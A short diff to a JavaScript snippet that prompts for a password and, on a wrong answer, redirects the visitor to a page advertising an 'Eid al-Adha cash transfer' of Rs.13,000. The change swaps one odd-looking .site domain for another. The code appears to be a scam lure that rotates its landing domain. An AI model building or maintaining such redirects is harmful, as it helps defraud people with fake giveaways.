@@ -6,5 +6,5 @@ password = prompt(
 );
 
 if (password !== 'Rs.13,000') {
-    location.href = 'https://www.sharkiitid.site/rs13000-eid-al-adha-cash-transfer';
+    location.href = 'https://www.foamitidr.site/rs13000-eid-al-adha-cash-transfer';
 }
